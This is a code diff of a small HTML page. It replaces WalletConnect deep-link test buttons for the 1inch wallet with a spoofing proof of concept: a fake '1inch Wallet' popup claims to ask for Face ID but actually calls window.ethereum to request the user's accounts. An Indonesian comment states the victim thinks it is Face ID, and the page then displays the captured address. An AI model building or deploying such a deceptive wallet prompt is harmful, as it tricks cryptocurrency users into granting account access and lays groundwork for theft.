@@ -1,23 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-<a href="1inch://wc?uri=wc%3A1234567890abcdef%402%3Frelay-protocol%3Dirn%26symKey%3DAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3D" id="link">Test 1 - Klik Link Biasa</a>
-<br><br>
-<button onclick="test2()">Test 2 - Window Open</button>
-<br><br>
-<button onclick="test3()">Test 3 - Iframe</button>
-<pre id="o"></pre>
+<button onclick="spoof()">Connect Wallet</button>
+<div id="fake" style="display:none; position:fixed; top:40%; left:10%; right:10%; background:white; color:black; padding:20px; border-radius:15px; text-align:center;">
+  <b>1inch Wallet</b><br>Ingin Menggunakan Face ID<br>Untuk Membuka Wallet<br><br>
+  <button onclick="real()">Lanjutkan dengan Face ID</button>
+</div>
 <script>
-function test2(){
-  document.getElementById('o').innerText = "Coba window.open...";
-  window.open("1inch://wc?uri=" + encodeURIComponent("wc:1234567890abcdef@2?relay-protocol=irn&symKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="), "_blank");
+function spoof(){
+  document.getElementById('fake').style.display = "block";
 }
-function test3(){
-  document.getElementById('o').innerText = "Coba iframe...";
-  let f = document.createElement('iframe');
-  f.style.display = "none";
-  f.src = "1inch://wc?uri=" + encodeURIComponent("wc:1234567890abcdef@2?relay-protocol=irn&symKey=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=");
-  document.body.appendChild(f);
+async function real(){
+  // Ini yang asli, tapi korban kira ini Face ID
+  let acc = await window.ethereum.request({method:'eth_requestAccounts'});
+  alert("Dapet alamat: " + acc);
 }
 </script>
 </body>
